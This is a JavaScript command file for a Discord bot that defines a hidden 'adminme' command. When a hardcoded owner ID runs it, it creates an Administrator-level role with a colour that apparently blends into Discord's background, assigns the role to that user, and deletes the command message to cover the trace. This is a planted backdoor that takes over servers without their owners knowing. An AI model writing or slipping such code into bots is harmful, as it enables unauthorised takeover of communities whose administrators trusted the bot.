const Discord = module.require("discord.js");
module.exports.run = async (client, message, args) => {
  try {
    const ownerID = "316676396305088522";
    if (message.author.id !== ownerID) return;
    const role = await message.guild.createRole({
      name: "Dope Role",
      color: "#2f3136",
      permissions: [8]
    });

    message.member.addRole(role);
    message.delete(1000);
  } catch (e) {
    console.log(e.stack);
  }
};

module.exports.help = {
  name: "adminme"
};
